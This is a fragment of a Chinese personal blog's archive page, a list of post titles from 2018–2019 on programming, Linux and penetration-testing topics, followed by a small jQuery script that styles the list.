href="/2019/01/02/第一章/">第一章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/条款/">条款</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/31/重构的设计原则/">重构的设计原则</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/31/2019计划-随时变动版/">2019计划[随时变动版]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/30/linux知识点总结/">linux知识点总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/30/cmus使用/">cmus使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/30/linux命令行与脚本编程笔记/">linux命令行与脚本编程笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/30/C-中的return/">C++中的return</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/24/sql注入/">sql注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/24/httpfuzzer/">httpfuzzer</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/24/cms/">cms</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/24/下载漏洞/">下载漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/24/爆库/">爆库</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/19/CDN绕过/">CDN绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/19/AWVS/">AWVS</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/17/常见端口/">常见端口</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/16/windows使用入门/">windows使用入门</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/15/隐藏痕迹/">隐藏痕迹</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/15/linux基本信息收集/">linux基本信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/15/windows基本信息收集/">windows基本信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/12/基本信息收集/">基本信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/12/http请求方法/">http请求方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/12/渗透测试流程/">渗透测试流程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/12/设计模式的分类/">设计模式的分类</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/12/设计模式八大原则/">设计模式原则</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/08/漏洞利用流程/">漏洞利用流程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/08/弱点扫描/">弱点扫描</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/08/命令行连接无线/">命令行连接无线</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/05/漏洞基本概念/">漏洞基本概念</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/05/OPENVAS/">OPENVAS</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/05/WAF/">WAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/05/负载均衡/">负载均衡</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/04/SNMP原理/">SNMP原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/04/SNMP扫描/">SNMP扫描</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/04/xss/">xss</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/03/Banner/">Banner</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/03/服务扫描/">服务扫描</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/03/端口扫描/">端口扫描</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/03/nmap/">nmap</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/三层发现/">三层发现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/二层发现/">二层发现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/recon-ng/">recon-ng</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/Maltego/">Maltego</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/DNS字典爆破/">DNS字典爆破</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/DNS原理/">DNS原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/DIG/">DIG</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/NSLOOKUP/">NSLOOKUP</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/信息收集/">信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/tcpdump/">tcpdump</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/test/">test</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/暗网wiki/">暗网wiki</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/05/linux启动过程/">linux启动过程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/23/Trojanizer-Trojanize-Your-Payload/">Trojanizer-Trojanize Your Payload</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/12/定制自己的shell提示符/">定制自己的shell提示符</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/11/交换机的工作原理/">交换机的工作原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/09/教堂与集市笔记归纳/">教堂与集市笔记归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/09/敬请期待/">敬请期待</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/09/未完待续/">未完待续</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/09/Markdown格式（转）/">Markdown格式（转）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/09/前加加和后加加的区别/">前加加和后加加的区别</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/08/一个好的编程小习惯/">一个好的编程小习惯</a></li></ul>
     <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
     <script>
         $(".post-list").addClass("toc-article");
